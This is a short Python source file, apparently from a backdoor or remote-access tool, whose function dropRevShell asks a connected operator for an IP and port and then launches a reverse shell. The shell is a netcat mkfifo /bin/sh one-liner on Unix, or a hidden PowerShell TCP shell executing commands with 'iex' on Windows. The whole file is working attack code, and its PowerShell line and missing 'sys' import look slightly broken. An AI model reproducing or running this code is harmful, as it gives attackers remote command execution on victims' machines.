#!/bin/env python3
import os

def dropRevShell(con):
    con.sendall(b'\nSpecify your IP: \n')
    ip = con.recv(2048)
    con.sendall(b'\nSpecify your port: \n')
    port = con.recv(2048)
    try:
        ip = str(ip.decode().strip())
        port = str(port.decode().strip())
        # if os.name == "nt":
        #     os.system()
        # else:
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f &"
        if os.name == "nt":
            cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'+ip+'",'+port+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        os.system(cmd)

    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

